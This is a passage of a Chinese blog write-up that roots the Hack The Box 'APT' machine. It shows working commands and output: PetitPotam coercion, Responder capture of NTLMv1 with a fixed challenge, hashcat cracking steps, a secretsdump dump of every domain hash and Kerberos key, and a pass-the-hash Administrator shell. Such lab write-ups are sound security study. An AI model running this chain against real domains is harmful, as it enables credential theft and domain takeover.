<p>这里跟着 <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2021/04/10/htb-apt.html#collect-net-ntlmv1-via-rpc--roguepotato">0xdf</a> 的说法是作者本意是想让用 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato"><code>rogue potato</code></a>，所以这里也搞一下。</p>
<p>因为我没用过，所以下面都是跟着 0xdf 做的</p>
<p>按照其说法这里主要用的是 <code>rogue potato</code> 会触发以system用户的smb身份验证的行为</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/</a></p>
</blockquote>
<p>通过阅读文章，发现应该是这部分应该通过”&quot;来实现自定义请求主机的网络路径，所以走的smb</p>
<blockquote>
<p>When we read the PrintSpoofer post we were impressed by clever trick of the named pipe validation path bypass (credits to @itm4n and @jonasLyk) where inserting ‘&#x2F;’ in the hostname will be converted in partial path of the named pipe!</p>
<p>With that in mind we returned the following binding information:</p>
<p>ncacn_np:localhost&#x2F;pipe&#x2F;roguepotato[\pipe\epmapper]</p>
<p>And you know what? The RPCSS were trying to connect to nonexistent named pipe \roguepotato\pipe\epmapper :</p>
</blockquote>
<p>先改一下ipv6的支持</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-6.png" alt="alt text"></p>
<p>也是同样更新 <code>IStorageTrigger.cpp</code> 文件的这个部分 ，让其能够支持ipv6（因为靶机的ipv4没有作为主出口，所以要走v6来发起客户端请求，于是这里就要改为v6了）</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-7.png" alt="alt text"></p>
<p>在这里ippsec遇到了df所以还演示了一下怎么过av</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://youtu.be/eRnqtXwCZVs">https://youtu.be/eRnqtXwCZVs</a></p>
</blockquote>
<p>奇怪的是我运行的时候用 <code>responder</code> 接不到请求</p>
<p>查了下是支持ipv6的</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://g-laurent.blogspot.com/2021/12/responder-and-ipv6-attacks.html">https://g-laurent.blogspot.com/2021/12/responder-and-ipv6-attacks.html</a></p>
</blockquote>
<p>但是不知道为啥呢..</p>
<p>所以按照0xdf的方式弄个rpc客户端</p>
<p>去clone了个新的impacket，然后发现好像没有rpcserver这个脚本，所以需要下载再patch下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$  wget https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ git apply --whitespace=fix --reject rpcrelayclientserver.patch</span><br></pre></td></tr></table></figure>

<p>再次查询现在就有了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ find .|grep rpcrela                                           </span><br><span class="line">./impacket/examples/ntlmrelayx/servers/rpcrelayserver.py</span><br><span class="line">./impacket/examples/ntlmrelayx/clients/rpcrelayclient.py</span><br><span class="line">./rpcrelayclientserver.patch</span><br></pre></td></tr></table></figure>

<p>也是将 <code>impacket/examples/ntlmrelayx/servers/rpcrelayserver.py</code> 这部分修改一下</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-8.png" alt="alt text"></p>
<p>因为没给他转发目标的参（也不需要再转了），所以不改的话会报这个</p>
<p><img src="/wpimages/2025/tracks-ad/APT/image-9.png" alt="alt text"></p>
<p>特么这里捯饬半天也不对，啊啊啊啊啊啊啊啊啊啊，这啊啊啊啊啊啊啊啊啊啊self和target的传参有问题导致结构体里的netloc不对，可能是我的impacket版本问题草了。</p>
<h1 id="root-route2-PetitPotam"><a href="#root-route2-PetitPotam" class="headerlink" title="root route2 - PetitPotam"></a>root route2 - PetitPotam</h1><p>类似的思路不过这里我用 <code>PetitPotam</code> 做的，反正既然他主机上已经强制ntlmv1了，那只要能主机触发请求就完事</p>
<p>依照<a target="_blank" rel="noopener" href="https://crack.sh/netntlm/">crash.sh</a> ntlmv1的要求</p>
<p>修改 <code>/etc/responder/Responder.conf </code> 中的挑战值为 <code>1122334455667788</code>（默认为random）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/responder/Responder.conf </span><br></pre></td></tr></table></figure>

<p>修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Challenge = 1122334455667788</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/tracks-ad/APT/image-10.png" alt="alt text"></p>
<p>然后再起监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 --lm  -v </span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/tracks-ad/APT/image-11.png" alt="alt text"></p>
<p>用小河马触发主机请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 PetitPotam.py -u henry.vinson_adm -p <span class="string">&#x27;G1#Ny5@2dvht&#x27;</span> -d htb.local -dc-ip apt.htb.local 10.10.16.14  <span class="string">&#x27;dead:beef::5c15:ad15:b39b:b275&#x27;</span></span><br><span class="line"></span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | <span class="string">&#x27;  \  </span></span><br><span class="line"><span class="string">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span></span><br><span class="line"><span class="string">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span></span><br><span class="line"><span class="string">          &quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span> </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC <span class="built_in">functions</span></span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to ncacn_np:dead:beef::5c15:ad15:b39b:b275[\PIPE\lsarpc]</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/tracks-ad/APT/image-12.png" alt="alt text"></p>
<p>get了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788</span><br></pre></td></tr></table></figure>

<p>然后拿去crash.sh解密即可（不过站点维护了解不了了..）</p>
<p>找到个<a target="_blank" rel="noopener" href="https://github.com/evilmog/ntlmv1-multi">ntlmv1-multi</a>能帮着转换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 ntlmv1.py --ntlmv1 &#x27;APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788&#x27;</span><br><span class="line">Hashfield Split:</span><br><span class="line">[&#x27;APT$&#x27;, &#x27;&#x27;, &#x27;HTB&#x27;, &#x27;95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384&#x27;, &#x27;95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384&#x27;, &#x27;1122334455667788&#x27;]</span><br><span class="line"></span><br><span class="line">Hostname: HTB</span><br><span class="line">Username: APT$</span><br><span class="line">Challenge: 1122334455667788</span><br><span class="line">LM Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384</span><br><span class="line">NT Response: 95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384</span><br><span class="line">CT1: 95ACA8C7248774CB</span><br><span class="line">CT2: 427E1AE5B8D5CE68</span><br><span class="line">CT3: 30A49B5BB858D384                                                                     </span><br><span class="line"></span><br><span class="line">To Calculate final 4 characters of NTLM hash use:</span><br><span class="line">./ct3_to_ntlm.bin 30A49B5BB858D384 1122334455667788</span><br><span class="line"></span><br><span class="line">To crack with hashcat create a file with the following contents:</span><br><span class="line">95ACA8C7248774CB:1122334455667788</span><br><span class="line">427E1AE5B8D5CE68:1122334455667788</span><br><span class="line"></span><br><span class="line">echo &quot;95ACA8C7248774CB:1122334455667788&quot;&gt;&gt;14000.hash</span><br><span class="line">echo &quot;427E1AE5B8D5CE68:1122334455667788&quot;&gt;&gt;14000.hash                                      </span><br><span class="line"></span><br><span class="line">To crack with hashcat:</span><br><span class="line">./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1</span><br><span class="line"></span><br><span class="line">Once complete run output through deskey_to_ntlm.pl</span><br></pre></td></tr></table></figure>

<p>然后特么跑十来分钟了还没出我还要上厕所，直接去找个wp拿一下nthash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-secretsdump -hashes :d167c3238864b12f5f82feae86a7f798 &#x27;htb.local/APT$@htb.local&#x27;           </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::</span><br><span class="line">henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::</span><br><span class="line">APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413</span><br><span class="line">Administrator:des-cbc-md5:0816d9d052239b8a</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b</span><br><span class="line">krbtgt:des-cbc-md5:f8c26238c2d976bf</span><br><span class="line">henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2</span><br><span class="line">henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af</span><br><span class="line">henry.vinson:des-cbc-md5:73b6f71cae264fad</span><br><span class="line">henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4</span><br><span class="line">henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b</span><br><span class="line">henry.vinson_adm:des-cbc-md5:5df8682c8c07a179</span><br><span class="line">APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454</span><br><span class="line">APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9</span><br><span class="line">APT$:des-cbc-md5:76c45245f104a4bf</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-u</span> administrator <span class="literal">-H</span> c370bddf384a691d811ff3495e8a72e2 <span class="literal">-i</span> apt.htb.local         </span><br><span class="line">                                        </span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">7</span></span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="function"><span class="keyword">function</span> <span class="title">is</span> <span class="title">unimplemented</span> <span class="title">on</span> <span class="title">this</span> <span class="title">machine</span></span></span><br><span class="line">                                        </span><br><span class="line"><span class="keyword">Data</span>: <span class="keyword">For</span> more information, check Evil<span class="literal">-WinRM</span> GitHub: https://github.com/Hackplayers/evil<span class="literal">-winrm</span><span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/<span class="built_in">r</span>*</span><br><span class="line"><span class="number">4</span>e7e8f8add328d0df0f09cd7f08b8d36</span><br></pre></td></tr></table></figure>

<p>下班</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/06/06/Tracks-cloud-Vessel/"
      title="Tracks-cloud-Vessel"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-cloud-Vessel
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/05/21/crtp-lab-note/"
      title="crtp-study-lab-note"
     >

    <p class="title-text">
      
        crtp-study-lab-note
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


